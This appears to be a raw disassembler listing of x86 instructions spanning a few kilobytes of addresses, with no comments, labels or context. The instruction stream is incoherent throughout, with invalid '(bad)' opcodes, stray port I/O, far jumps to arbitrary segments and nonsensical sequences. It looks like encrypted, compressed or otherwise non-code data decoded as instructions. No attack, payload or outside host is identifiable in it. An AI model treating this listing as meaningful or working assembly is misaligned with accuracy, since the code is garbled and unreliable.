  42d814:	mov    ecx,0x32ed3e92
  42d819:	mov    bh,0x14
  42d81b:	cmp    eax,0xe1859eec
  42d820:	cmp    eax,0x5d16e14b
  42d825:	xchg   ebx,eax
  42d826:	xor    al,0x21
  42d828:	push   edi
  42d829:	fnsave [esi-0x53216423]
  42d82f:	mov    ebx,0x94618838
  42d834:	sub    esi,DWORD PTR [edi+0x7c]
  42d837:	jp     0x42d8b0
  42d839:	xchg   edx,eax
  42d83a:	scas   eax,DWORD PTR es:[edi]
  42d83b:	xchg   ecx,eax
  42d83c:	mov    ds:0x70ea2c89,eax
	...
  42d8b1:	add    BYTE PTR [eax],al
  42d8b3:	add    BYTE PTR [eax],dl
  42d8b5:	sbb    ecx,ecx
  42d8b7:	jmp    0xfb73d487
  42d8bc:	mov    edx,0x7fdcc254
  42d8c1:	inc    ebx
  42d8c2:	fdivr  st,st(6)
  42d8c4:	aas    
  42d8c5:	loope  0x42d8c8
  42d8c7:	add    ch,dh
  42d8c9:	add    BYTE PTR [eax],al
  42d8cb:	add    al,bl
  42d8cd:	inc    ebx
  42d8ce:	jp     0x42d898
  42d8d0:	cmp    dl,BYTE PTR [ebx-0x485c97e9]
  42d8d6:	scas   al,BYTE PTR es:[edi]
  42d8d7:	inc    esp
  42d8d8:	jg     0x42d87e
  42d8da:	fsubr  st,st(0)
  42d8dc:	dec    edx
  42d8dd:	or     BYTE PTR [ebp+0x51],0x12
  42d8e1:	cmp    al,0x4a
  42d8e3:	(bad)
  42d8e7:	jle    0x42d90f
  42d8e9:	mov    ebx,esi
  42d8eb:	imul   edi,DWORD PTR [ecx-0x213217b2],0xc
  42d8f2:	scas   al,BYTE PTR es:[edi]
  42d8f3:	mov    ds:0xe26d6836,al
  42d8f8:	mov    eax,ds:0xd9f58206
  42d8fd:	sbb    ebp,DWORD PTR [esp+ebp*2-0x2677dc46]
  42d904:	or     eax,0x161d41eb
  42d909:	jl     0x42d8ce
  42d90b:	pop    esp
  42d90c:	adc    DWORD PTR [eax],ebx
  42d90e:	cmp    eax,0x3412b223
  42d913:	pop    edi
  42d914:	je     0x42d96c
  42d916:	or     eax,0x687e6116
  42d91b:	jno    0x42d976
  42d91d:	push   esi
  42d91e:	in     eax,0x5e
  42d920:	jb     0x42d8dc
  42d922:	out    dx,eax
  42d923:	xchg   DWORD PTR [ecx+0x4a],esi
  42d926:	fucomi st,st(0)
  42d928:	lock push ebp
  42d92a:	loope  0x42d8ef
  42d92c:	add    dl,bl
  42d92e:	scas   al,BYTE PTR es:[edi]
  42d92f:	loope  0x42d98d
  42d931:	cmc    
  42d932:	jae    0x42d93a
  42d934:	fs call 0x52ac:0x6fc092e9
  42d93c:	or     DWORD PTR [edi],esi
  42d93e:	data16 add BYTE PTR [esi],ah
  42d941:	dec    esi
  42d942:	push   ecx
  42d943:	adc    eax,0xf6f8c657
  42d948:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d949:	jmp    0x2bd8:0x9626dbb8
  42d950:	cs jle 0x42d912
  42d953:	call   0x1f3086d9
  42d958:	and    edx,DWORD PTR [ecx-0x46]
  42d95b:	push   cs
  42d95c:	sbb    BYTE PTR ds:0xd73a5e8a,ch
  42d962:	outs   dx,BYTE PTR ds:[esi]
  42d963:	mov    edx,0x7e0a6696
  42d968:	lock clc 
  42d96a:	dec    edi
  42d96b:	and    esp,eax
  42d96d:	mov    ah,0xe6
  42d96f:	test   DWORD PTR [edx+0x1f849ff6],eax
  42d975:	jmp    0x46785618
  42d97a:	add    al,0xdc
  42d97c:	push   0x1e88b732
  42d981:	ss push esi
  42d983:	jbe    0x42d933
  42d985:	mov    cl,0x77
  42d987:	loop   0x42da07
  42d989:	mov    ds:0xb040b7ba,eax
  42d98e:	mov    al,ds:0xddf5cd64
  42d993:	push   0xffffff8d
  42d995:	fucomi st,st(6)
  42d997:	mov    bl,0xaa
  42d999:	test   eax,0x547ccba5
  42d99e:	js     0x42d95b
  42d9a0:	loopne 0x42d9c8
  42d9a2:	cs push ss
  42d9a4:	sbb    edx,DWORD PTR ds:0xf02f295f
  42d9aa:	dec    esi
  42d9ab:	inc    esp
  42d9ac:	or     al,0x60
  42d9ae:	fistp  DWORD PTR [esp+edx*4]
  42d9b1:	lahf   
  42d9b2:	mov    eax,ds:0xf433ca23
  42d9b7:	push   es
  42d9b8:	xor    BYTE PTR [eax-0x28be41d8],0x33
  42d9bf:	sub    bl,0x0
	...
  42da32:	add    BYTE PTR [eax],al
  42da34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da35:	fimul  DWORD PTR [eax-0x10ac02bf]
  42da3b:	(bad)  
  42da3c:	jp     0x42da02
  42da3e:	dec    edi
  42da3f:	(bad)  
  42da40:	push   cs
  42da41:	xchg   edi,eax
  42da42:	cdq    
  42da43:	shl    BYTE PTR [edx+eiz*8],1
  42da46:	add    DWORD PTR [eax],eax
  42da48:	cmc    
  42da49:	add    BYTE PTR [eax],al
  42da4b:	add    BYTE PTR [eax],ch
  42da4d:	adc    eax,0xa59ad98c
  42da52:	inc    edi
  42da53:	mov    ebx,0xbb2e77b0
  42da58:	lods   eax,DWORD PTR ds:[esi]
  42da59:	dec    esp
  42da5a:	nop
  42da5b:	jle    0x42dab3
  42da5d:	(bad)  
  42da5e:	popf   
  42da5f:	dec    esi
  42da60:	call   0x76ca7089
  42da65:	imul   esi,DWORD PTR [ebx+0xd],0xffffffb4
  42da69:	cmp    al,0x6d
  42da6b:	sahf   
  42da6c:	mov    dh,0x1d
  42da6e:	dec    edi
  42da6f:	add    al,0xdc
  42da71:	cmc    
  42da72:	fs sub eax,0x77a8acef
  42da78:	or     cl,BYTE PTR [edx+esi*1-0x62]
  42da7c:	neg    BYTE PTR [esi-0x40]
  42da7f:	or     eax,0x41567033
  42da84:	sar    DWORD PTR [eax-0x48f75aea],cl
  42da8a:	leave  
  42da8b:	bound  edi,QWORD PTR [edx]
  42da8d:	and    DWORD PTR [edi],eax
  42da8f:	mov    edi,DWORD PTR [ebx]
  42da91:	cmp    esp,0xffffffcf
  42da94:	xchg   esp,eax
  42da95:	sub    ecx,ebp
  42da97:	fcmove st,st(6)
  42da99:	xchg   ebp,eax
  42da9a:	stos   DWORD PTR es:[edi],eax
  42da9b:	and    DWORD PTR [ebx-0x59],0x5cb76794
  42daa2:	lds    eax,FWORD PTR ds:0x3b3bf9d0
  42daa8:	push   cs
  42daa9:	vpblendw xmm2,xmm5,XMMWORD PTR [ebx],0xb3
  42daaf:	fisub  DWORD PTR [edi+0x49313538]
  42dab5:	lods   eax,DWORD PTR ds:[esi]
  42dab6:	retf   
  42dab7:	je     0x42dac8
  42dab9:	lock inc edx
  42dabb:	inc    ecx
  42dabc:	out    0x62,al
  42dabe:	jns    0x42dac0
  42dac0:	daa    
  42dac1:	scas   al,BYTE PTR es:[edi]
  42dac2:	stos   BYTE PTR es:[edi],al
  42dac3:	cli    
  42dac4:	dec    edx
  42dac5:	pop    esi
  42dac6:	jns    0x42db43
  42dac8:	repnz dec esi
  42daca:	xchg   ebx,eax
  42dacb:	std    
  42dacc:	pop    ds
  42dacd:	dec    ebp
  42dace:	mov    esi,DWORD PTR [edx-0x33]
  42dad1:	add    ch,cl
  42dad3:	and    dl,BYTE PTR [ebx]
  42dad5:	(bad)  
  42dad6:	sub    al,0xa9
  42dad8:	jl     0x42da84
  42dada:	loop   0x42db25
  42dadc:	je     0x42daf4
  42dade:	ins    DWORD PTR es:[edi],dx
  42dadf:	ins    BYTE PTR es:[edi],dx
  42dae0:	aam    0xcd
  42dae2:	xlat   BYTE PTR ds:[ebx]
  42dae3:	inc    edi
  42dae4:	int    0x3
  42dae6:	sahf   
  42dae7:	pop    esi
  42dae8:	les    edx,FWORD PTR [ebx+ebp*4+0x2104f37f]
  42daef:	out    0x0,al
  42daf1:	int3   
  42daf2:	push   ebp
  42daf3:	iret   
  42daf4:	cwde   
  42daf5:	in     eax,dx
  42daf6:	inc    edx
  42daf7:	or     DWORD PTR [ebp-0x64],0x1f3c08d5
  42dafe:	je     0x42da9d
  42db00:	and    ch,0xa9
  42db03:	dec    esp
  42db04:	mov    cl,BYTE PTR [edx-0xc]
  42db07:	in     eax,dx
  42db08:	les    ebp,FWORD PTR [ebp-0x514c22f9]
  42db0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42db0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42db10:	popa   
  42db11:	jmp    0x6ba3:0x92e51306
  42db18:	dec    ecx
  42db19:	out    dx,eax
  42db1a:	das    
  42db1b:	retf   
  42db1c:	dec    edi
  42db1d:	push   eax
  42db1e:	sub    DWORD PTR [eax-0x5fd06c5d],edi
  42db24:	pop    ebp
  42db25:	cmp    eax,0xf1de0a10
  42db2a:	push   esi
  42db2b:	cmc    
  42db2c:	cmp    eax,0x987e797f
  42db31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42db32:	int3   
  42db33:	fcom   QWORD PTR [ebp-0x5c]
  42db36:	xlat   BYTE PTR ds:[ebx]
  42db37:	push   cs
  42db38:	or     BYTE PTR [esi+0x10f053d9],ch
  42db3e:	lds    edx,FWORD PTR [ebx+0xdf]
	...
  42dbb4:	jg     0x42dbb8
  42dbb6:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42dbba:	call   FWORD PTR [ebx]
  42dbbc:	(bad)  
  42dbbd:	mov    fs:0x1945de37,al
  42dbc3:	daa    
  42dbc4:	sub    ebx,esp
  42dbc6:	add    DWORD PTR [eax],eax
  42dbc8:	cmc    
  42dbc9:	add    BYTE PTR [eax],al
  42dbcb:	add    BYTE PTR [esi],dl
  42dbcd:	stc    
  42dbce:	mov    BYTE PTR [edx],dh
  42dbd0:	sbb    ch,dl
  42dbd2:	arpl   WORD PTR [eax*8+0x75af91a],si
  42dbd9:	(bad)  
  42dbda:	jne    0x42db99
  42dbdc:	cmp    ecx,edi
  42dbde:	cmp    eax,0xca6bdddc
  42dbe3:	pop    edx
  42dbe4:	inc    esp
  42dbe5:	push   ebp
  42dbe6:	test   DWORD PTR [edx],esp
  42dbe8:	rol    DWORD PTR [edi],cl
  42dbea:	cdq    
  42dbeb:	lock stc 
  42dbed:	mov    ds:0x4439f126,al
  42dbf2:	inc    edx
  42dbf3:	ins    DWORD PTR es:[edi],dx
  42dbf4:	mov    ah,0x1
  42dbf6:	jns    0x42dbf7
  42dbf8:	addr16 loope 0x42dc45
  42dbfb:	outs   dx,BYTE PTR ds:[esi]
  42dbfc:	xor    eax,0x2960d3b
  42dc01:	pop    ebx
  42dc02:	loopne 0x42db8d
  42dc04:	bound  edi,QWORD PTR ds:0x121c844
  42dc0a:	gs pop ds
  42dc0c:	out    dx,eax
  42dc0d:	mov    dh,0xde
  42dc0f:	pop    ebp
  42dc10:	call   FWORD PTR [ebx+0xd]
  42dc13:	mov    ds:0x66cb9754,eax
  42dc18:	and    eax,0x23e8dcc2
  42dc1d:	outs   dx,DWORD PTR ds:[esi]
  42dc1e:	mov    al,0xe4
  42dc20:	loop   0x42dbb9
  42dc22:	or     al,0xec
  42dc24:	push   edi
  42dc25:	cmp    cl,BYTE PTR [ecx-0x22]
  42dc28:	inc    edx
  42dc29:	in     al,0x61
  42dc2b:	out    dx,eax
  42dc2c:	inc    esp
  42dc2d:	sbb    al,0xcc
  42dc2f:	lods   al,BYTE PTR ds:[esi]
  42dc30:	push   0x18
  42dc32:	or     DWORD PTR [edx],ebp
  42dc34:	(bad)  
  42dc35:	jl     0x42dbd4
  42dc37:	ret    0xa9f0
  42dc3a:	cmp    DWORD PTR [ecx-0x7005b358],0x526540aa
  42dc44:	or     al,0x3a
  42dc46:	int    0x4f
  42dc48:	jns    0x42dbdc
  42dc4a:	pop    edi
  42dc4b:	rol    BYTE PTR [eax+0x12367cdd],0xd4
  42dc52:	call   0x4656:0xf0fecdf7
  42dc59:	rol    DWORD PTR [edx-0x564ca7c2],1
  42dc5f:	into   
  42dc60:	push   es
  42dc61:	jg     0x42dc98
  42dc63:	mov    esp,0x6a8f2751
  42dc68:	retf   0xa42
  42dc6b:	push   0xffffffe1
  42dc6d:	jl     0x42dce9
  42dc6f:	xor    ebx,ebx
  42dc71:	add    al,0xa6
  42dc73:	or     DWORD PTR [ebp+0x43],eax
  42dc76:	dec    esp
  42dc77:	call   0x8013:0x8e6e33c8
  42dc7e:	mov    esi,0x77b0111f
  42dc83:	sub    al,0x2e
  42dc85:	push   0xffffff87
  42dc87:	cmp    eax,0x9f4b2d6d
  42dc8c:	fist   WORD PTR [eax]
  42dc8e:	dec    DWORD PTR [edx+eiz*4]
  42dc91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc92:	shr    dl,1
  42dc94:	jbe    0x42dcda
  42dc96:	sub    al,0xa0
  42dc98:	retf   
  42dc99:	arpl   WORD PTR [edx+edx*2],cx
  42dc9c:	dec    edx
  42dc9d:	out    0xc6,al
  42dc9f:	rcl    DWORD PTR [eax-0x2f9240b2],0x20
  42dca6:	push   ebx
  42dca7:	sar    DWORD PTR [eax],cl
  42dca9:	test   esp,esi
  42dcab:	in     eax,0xcb
  42dcad:	pop    edi
  42dcae:	or     eax,DWORD PTR ds:0x6c349c84
  42dcb4:	jp     0x42dc9a
  42dcb6:	mov    al,ds:0x6d500df7
  42dcbb:	dec    esi
  42dcbc:	popa   
  42dcbd:	pusha  
  42dcbe:	push   0xffffffdc
  42dcc0:	add    eax,0x0
	...
  42dd31:	add    BYTE PTR [eax],al
  42dd33:	add    BYTE PTR [ecx],bl
  42dd35:	mov    eax,ds:0xdffe87fe
  42dd3a:	jns    0x42dcfb
  42dd3c:	daa    
  42dd3d:	data16 fnstsw WORD PTR [ecx-0x6a0306bc]
  42dd44:	push   ds
  42dd45:	in     al,0x1
  42dd47:	add    ch,dh
  42dd49:	add    BYTE PTR [eax],al
  42dd4b:	add    BYTE PTR [ebp-0x3d],cl
  42dd4e:	sbb    bh,bh
  42dd50:	ds sub ah,0xd0
  42dd54:	int    0x78
  42dd56:	sti    
  42dd57:	ds mov cs,ebp
  42dd5a:	rcr    eax,cl
  42dd5c:	jb     0x42ddaf
  42dd5e:	stc    
  42dd5f:	lock add esp,DWORD PTR [edx-0x6a59b849]
  42dd66:	call   0x4415:0xd9683cbe
  42dd6d:	test   al,bh
  42dd6f:	cmp    al,0x2c
  42dd71:	ja     0x42dda3
  42dd73:	inc    ecx
  42dd74:	ds push edx
  42dd76:	mov    bh,0xa7
  42dd78:	les    ebp,FWORD PTR [ebp+0x17004f2e]
  42dd7e:	mov    ch,0xec
  42dd80:	mov    bl,0x27
  42dd82:	out    0x33,eax
  42dd84:	imul   edi,DWORD PTR [edx-0x40696e16],0x93e19208
  42dd8e:	mov    cl,0x37
  42dd90:	or     ah,BYTE PTR [ebx-0x55]
  42dd93:	mov    ds:0x1cd3bd6d,eax
  42dd98:	mov    bl,0x2e
  42dd9a:	mov    DWORD PTR [ebp-0x556eff6a],edi
  42dda0:	test   DWORD PTR [esi-0x1c],ecx
  42dda3:	cmp    dh,bl
  42dda5:	mov    ah,0x56
  42dda7:	std    
  42dda8:	iret   
  42dda9:	lods   eax,DWORD PTR ds:[esi]
  42ddaa:	dec    ecx
  42ddab:	nop
  42ddac:	xlat   BYTE PTR ds:[ebx]
  42ddad:	imul   ebp,DWORD PTR [esi-0x75],0x5a
  42ddb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ddb2:	xchg   esi,eax
  42ddb3:	dec    ebx
  42ddb4:	in     eax,0xb6
  42ddb6:	mov    edi,0x3a4bb78b
  42ddbb:	sbb    eax,0x203d17bc
  42ddc0:	jmp    0xed8a0ea6
  42ddc5:	lahf   
  42ddc6:	inc    edi
  42ddc7:	repz lea edx,[eax+0x63]
  42ddcb:	jno    0x42de09
  42ddcd:	jle    0x42de03
  42ddcf:	pop    eax
  42ddd0:	pushf  
  42ddd1:	nop
  42ddd2:	mov    eax,ds:0x419a6069
  42ddd7:	or     ebp,ecx
  42ddd9:	adc    al,0x6d
  42dddb:	cmc    
  42dddc:	sar    DWORD PTR ds:0xe9575809,1
  42dde2:	retf   0x57d1
  42dde5:	and    ecx,edx
  42dde7:	jne    0x42de54
  42dde9:	(bad)
  42ddec:	pop    ss
  42dded:	test   cl,0xb2
  42ddf0:	mov    al,ds:0xa008b69b
  42ddf5:	aaa    
  42ddf6:	pushf  
  42ddf7:	cmp    DWORD PTR [ebp-0x48],0x7db105f6
  42ddfe:	sub    BYTE PTR [ecx+0x37],al
  42de01:	jl     0x42de5a
  42de03:	iret   
  42de04:	les    edx,FWORD PTR ds:0x29b4a54e
  42de0a:	cmp    eax,0x2aedf6be
  42de0f:	out    dx,eax
  42de10:	enter  0x7a1f,0x2b
  42de14:	scas   eax,DWORD PTR es:[edi]
  42de15:	into   
  42de16:	in     al,dx
  42de17:	push   ebx
  42de18:	js     0x42de6f
  42de1a:	mov    eax,0x5968088c
  42de1f:	cmp    al,0x71
  42de21:	outs   dx,BYTE PTR ds:[esi]
  42de22:	sbb    eax,0x844d36ee
  42de27:	cmc    
  42de28:	call   DWORD PTR [edi]
  42de2a:	ret    
  42de2b:	mov    dl,0xd4
  42de2d:	pop    edi
  42de2e:	ja     0x42de8d
  42de30:	push   eax
  42de31:	aam    0x95
  42de33:	fmul   st,st(7)
  42de35:	dec    ecx
  42de36:	or     bh,ah
  42de38:	lahf   
  42de39:	lods   eax,DWORD PTR ds:[esi]
  42de3a:	shr    BYTE PTR [esi-0x36b391c8],0xc0
	...
  42deb1:	add    BYTE PTR [eax],al
  42deb3:	add    BYTE PTR [ebx+0x3d],dh
  42deb6:	fadd   st,st(1)
  42deb8:	fsubrp st(5),st
  42deba:	jnp    0x42de7b
  42debc:	push   ds
  42debd:	xor    edi,DWORD PTR [esi-0x56762ef4]
  42dec3:	xor    eax,0x1e513
  42dec8:	cmc    
  42dec9:	add    BYTE PTR [eax],al
  42decb:	add    BYTE PTR [ebp+0x4a1edb7],cl
  42ded1:	jge    0x42dec6
  42ded3:	scas   eax,DWORD PTR es:[edi]
  42ded4:	push   esi
  42ded5:	fucom  st(7)
  42ded7:	lahf   
  42ded8:	in     al,0xb9
  42deda:	shr    dl,0x29
  42dedd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dede:	push   cs
  42dedf:	cli    
  42dee0:	cli    
  42dee1:	lea    esp,[ebp-0x3af4c769]
  42dee7:	jb     0x42df5b
  42dee9:	lahf   
  42deea:	fcom   QWORD PTR [ecx-0x4e514226]
  42def0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42def1:	and    ch,BYTE PTR [edx+edx*8+0x74434fd5]
  42def8:	xor    DWORD PTR [esi+0x6ffbecd1],edi
  42defe:	out    0x95,eax
  42df00:	push   0xdb8fe2a7
  42df05:	mov    ecx,0x719b3842
  42df0a:	adc    al,0xa
  42df0c:	or     ebx,0xcf82a8e6
  42df12:	ficom  WORD PTR [edx-0x3c04be0d]
  42df18:	jp     0x42df84
  42df1a:	popa   
  42df1b:	out    0xb5,al
  42df1d:	ja     0x42df6b
  42df1f:	ficomp WORD PTR [esi-0x4f]
  42df22:	fmulp  st(0),st
  42df24:	aas    
  42df25:	out    dx,al
  42df26:	je     0x42ded6
  42df28:	sbb    DWORD PTR [eax-0x46],ecx
  42df2b:	xchg   ebp,eax
  42df2c:	imul   ecx,ebp,0x154983db
  42df32:	(bad)  
  42df33:	in     al,0xb8
  42df35:	xchg   esi,eax
  42df36:	sub    eax,0x705ecdae
  42df3b:	mov    eax,ecx
  42df3d:	mov    bh,0xbf
  42df3f:	mov    ebp,0xef37ed33
  42df44:	test   al,0x6a
  42df46:	add    eax,ebx
  42df48:	shr    DWORD PTR [ebp-0x3],cl
  42df4b:	xor    al,0xc8
  42df4d:	sbb    BYTE PTR [eax+ecx*4+0xf],ch
  42df51:	cmp    dh,BYTE PTR [ecx-0x1a]
  42df54:	sbb    edx,DWORD PTR [eax+0x4f]
  42df57:	inc    ecx
  42df58:	aam    0xc1
  42df5a:	fild   WORD PTR [ecx-0x30904e38]
  42df60:	dec    ecx
  42df61:	stc    
  42df62:	pop    ecx
  42df63:	xor    BYTE PTR [ebx+0x42],0x2e
  42df67:	cwde   
  42df68:	mov    al,ds:0xf0f2a440
  42df6d:	jg     0x42df02
  42df6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df70:	adc    bh,BYTE PTR [ecx+0x39]
  42df73:	in     eax,0x9
  42df75:	pop    ecx
  42df76:	popf   
  42df77:	fdivr  DWORD PTR [ebp-0xfd6e446]
  42df7d:	adc    edi,eax
  42df7f:	mov    esi,0x6b9f6447
  42df84:	jecxz  0x42dfdd
  42df86:	add    ebx,ebx
  42df88:	lahf   
  42df89:	call   DWORD PTR [ebx]
  42df8b:	jmp    0xbd1004cf
  42df90:	dec    edi
  42df91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42df92:	ret    0x9980
  42df95:	mul    DWORD PTR [edi+0xba14b3b]
  42df9b:	das    
  42df9c:	ins    BYTE PTR es:[edi],dx
  42df9d:	mov    ds:0x2aa4369,al
  42dfa2:	push   edi
  42dfa3:	js     0x42df32
  42dfa5:	or     ecx,DWORD PTR [edi+0x1104e4a]
  42dfab:	lock adc ebx,DWORD PTR [ebx-0x72ab6375]
  42dfb2:	add    al,0x81
  42dfb4:	lea    esp,[esi-0x52b3057]
  42dfba:	cwde   
  42dfbb:	es pop ds
  42dfbd:	shl    DWORD PTR gs:[eax+0x8c],1
	...
  42e034:	push   eax
  42e035:	cmp    al,dh
  42e037:	sub    al,0xee
  42e039:	cld    
  42e03a:	cli    
  42e03b:	jle    0x42e08c
  42e03d:	add    BYTE PTR [ebx-0x68719b1e],0x8
  42e044:	or     dh,ah
  42e046:	add    DWORD PTR [eax],eax
  42e048:	cmc    
  42e049:	add    BYTE PTR [eax],al
  42e04b:	add    BYTE PTR [edi+0x0],dl
  42e04e:	ret    0x1af4
  42e051:	(bad)  
  42e052:	pushf  
  42e053:	sub    ebp,eax
  42e055:	jnp    0x42e05d
  42e057:	or     eax,0xabf0cc6b
  42e05c:	xor    dl,BYTE PTR [ebx-0x613bc710]
  42e062:	add    ah,BYTE PTR [esi-0x45]
  42e065:	pop    edi
  42e066:	sub    ebx,0x6069749a
  42e06c:	jno    0x42e078
  42e06e:	or     esp,esp
  42e070:	sub    al,BYTE PTR [eax-0x2f5ecdf4]
  42e076:	dec    edx
  42e077:	inc    bx
  42e079:	call   0xb2e8:0x7881e768
  42e080:	jno    0x42e0c7
  42e082:	std    
  42e083:	hlt    
  42e084:	adc    ebx,edi
  42e086:	dec    ebx
  42e087:	mov    ebp,0xba4e5a51
  42e08c:	call   0x4571:0xa6084c1d
  42e093:	jmp    0xedc56bba
  42e098:	inc    esi
  42e099:	or     BYTE PTR [esi],ah
  42e09b:	test   DWORD PTR [ebp-0x77bba982],0xbce28e5d
  42e0a5:	iret   
  42e0a6:	jns    0x42e121
  42e0a8:	mov    DWORD PTR fs:[edx-0x43],ecx
  42e0ac:	or     eax,0xf28f602
  42e0b1:	loope  0x42e095
  42e0b3:	ficom  WORD PTR [edi]
  42e0b5:	xchg   edx,eax
  42e0b6:	test   BYTE PTR [ecx+ebx*8+0x4949eaea],ch
  42e0bd:	cmp    esi,DWORD PTR [ecx-0x5b]
  42e0c0:	aam    0x7b
  42e0c2:	xor    eax,0xfc288714
  42e0c7:	mov    ds:0x77d10d4b,eax
  42e0cc:	jecxz  0x42e0a0
  42e0ce:	std    
  42e0cf:	or     edi,DWORD PTR ds:0xf2269cc6
  42e0d5:	sbb    bl,bh
  42e0d7:	mov    al,ds:0x8b6dca93
  42e0dc:	or     DWORD PTR [ecx+0x7f],esp
  42e0df:	xchg   ebx,eax
  42e0e0:	cmp    cl,BYTE PTR [edi]
  42e0e2:	std    
  42e0e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e0e4:	fbstp  TBYTE PTR [edi]
  42e0e6:	dec    ebp
  42e0e7:	retf   
  42e0e8:	pop    es
  42e0e9:	push   ds
  42e0ea:	push   esi
  42e0eb:	stc    
  42e0ec:	mov    fs,ebx
  42e0ee:	cmp    al,0x17
  42e0f0:	out    dx,al
  42e0f1:	push   0xffffff9c
  42e0f3:	and    BYTE PTR [ecx+0x46],0x5c
  42e0f7:	lods   al,BYTE PTR ds:[esi]
  42e0f8:	call   0xe64dc0e3
  42e0fd:	jmp    0xe3d3:0xbdaf2c77
  42e104:	xchg   ebx,eax
  42e105:	out    dx,eax
  42e106:	jbe    0x42e150
  42e108:	les    eax,FWORD PTR [eax+0x13cf519e]
  42e10e:	pop    es
  42e10f:	scas   al,BYTE PTR es:[edi]
  42e110:	jmp    eax
  42e112:	mov    ecx,0x59de5349
  42e117:	xchg   esp,eax
  42e118:	sub    cl,BYTE PTR [eax]
  42e11a:	out    dx,eax
  42e11b:	xor    BYTE PTR [edx-0x7ea7fe1c],dl
  42e121:	bound  edi,QWORD PTR ds:0xab44fc59
  42e127:	dec    edi
  42e128:	ret    0x2098
  42e12b:	sub    DWORD PTR [edx-0x7b],ecx
  42e12e:	lahf   
  42e12f:	push   ds
  42e130:	and    eax,0xcf78b88f
  42e135:	inc    eax
  42e136:	mov    dl,0x95
  42e138:	mov    al,0x26
  42e13a:	jmp    0xbf092cc0
  42e13f:	mov    dh,0x2
	...
  42e1b1:	add    BYTE PTR [eax],al
  42e1b3:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42e1b9:	ja     0x42e16a
  42e1bb:	sti    
  42e1bc:	dec    esi
  42e1bd:	push   edx
  42e1be:	sbb    eax,0xe5a41671
  42e1c3:	inc    esp
  42e1c4:	std    
  42e1c5:	out    0x1,al
  42e1c7:	add    ch,dh
  42e1c9:	add    BYTE PTR [eax],al
  42e1cb:	add    bl,cl
  42e1cd:	mov    edx,DWORD PTR [eax+esi*1+0x1c]
  42e1d1:	iret   
  42e1d2:	mov    esi,0x893a6d1b
  42e1d7:	push   esi
  42e1d8:	and    al,0x31
  42e1da:	or     eax,0xe1a1de2c
  42e1df:	outs   dx,DWORD PTR ds:[esi]
  42e1e0:	bnd ret 0xe011
  42e1e4:	xor    esi,DWORD PTR [esi+0x1b]
  42e1e7:	jmp    0x42e1a7
  42e1e9:	lods   eax,DWORD PTR ds:[esi]
  42e1ea:	lahf   
  42e1eb:	inc    edx
  42e1ec:	and    edi,ecx
  42e1ee:	xor    DWORD PTR fs:[ebx+ebp*8-0x1c],esi
  42e1f3:	jle    0x42e1aa
  42e1f5:	mov    bl,dh
  42e1f7:	retf   0xe40
  42e1fa:	dec    ebp
  42e1fb:	xchg   edx,eax
  42e1fc:	jmp    0xc38b66e2
  42e201:	pop    ecx
  42e202:	out    dx,al
  42e203:	push   0xbc4b55ee
  42e208:	jmp    0xd233:0x1f0bc7b4
  42e20f:	inc    esp
  42e210:	gs xor ah,dh
  42e213:	and    BYTE PTR [eax-0x50643f2f],dh
  42e219:	mov    dh,0x5b
  42e21b:	scas   al,BYTE PTR es:[edi]
  42e21c:	inc    ebx
  42e21d:	lock inc edi
  42e21f:	ja     0x42e200
  42e221:	in     eax,dx
  42e222:	mov    bl,0x35
  42e224:	jle    0x42e226
  42e226:	ror    DWORD PTR [ebx],cl
  42e228:	mov    bl,0x2c
  42e22a:	xor    BYTE PTR [edi],al
  42e22c:	dec    edx
  42e22d:	xchg   ecx,esi
  42e22f:	mov    ds:0x645fe5e4,eax
  42e234:	aad    0x7a
  42e236:	daa    
  42e237:	sahf   
  42e238:	push   ebp
  42e239:	imul   BYTE PTR [edx-0x2aba2761]
  42e23f:	lods   al,BYTE PTR ds:[esi]
  42e240:	push   eax
  42e241:	dec    edi
  42e242:	jge    0x42e1e8
  42e244:	movntps XMMWORD PTR [esi-0x6707a599],xmm4
  42e24b:	sar    DWORD PTR [ebx],0x31
  42e24e:	dec    ecx
  42e24f:	retf   
  42e250:	cld    
  42e251:	int    0xce
  42e253:	cdq    
  42e254:	push   ds
  42e255:	dec    edx
  42e256:	pop    ds
  42e257:	out    0x85,al
  42e259:	test   al,0x7c
  42e25b:	xchg   ebx,eax
  42e25c:	mov    cl,0x6
  42e25e:	lock in eax,dx
  42e260:	sti    
  42e261:	sbb    DWORD PTR [esi],edi
  42e263:	sbb    bl,BYTE PTR [ecx+eax*4+0x343fef41]
  42e26a:	ds cld 
  42e26c:	mov    ebp,0x4d9a3787
  42e271:	loopne 0x42e20c
  42e273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e274:	mov    esp,0x28e89964
  42e279:	add    dl,BYTE PTR [ebx-0x3]
  42e27c:	out    dx,eax
  42e27d:	add    dl,cl
  42e27f:	xchg   ecx,eax
  42e280:	xor    DWORD PTR [edi+0x42],ecx
  42e283:	mov    al,0x59
  42e285:	sub    dh,BYTE PTR [esp+eax*8-0x6]
  42e289:	and    DWORD PTR [ecx-0x5c],esi
  42e28c:	push   0xffffffc3
  42e28e:	int3   
  42e28f:	rol    BYTE PTR [edi-0x261cf64c],cl
  42e295:	sub    dl,BYTE PTR [edx]
  42e297:	inc    edi
  42e298:	inc    edi
  42e299:	inc    edx
  42e29a:	dec    esp
  42e29b:	adc    eax,0x85da688
  42e2a0:	pop    ss
  42e2a1:	xor    ebp,DWORD PTR [ebx+0x6cfc0acf]
  42e2a7:	outs   dx,BYTE PTR ds:[esi]
  42e2a8:	jg     0x42e30a
  42e2aa:	adc    DWORD PTR [eax+0x427ed0fe],esi
  42e2b0:	mov    edi,DWORD PTR [eax]
  42e2b2:	xchg   esp,eax
  42e2b3:	cli    
  42e2b4:	arpl   WORD PTR [eax],di
  42e2b6:	fneni(8087 only) 
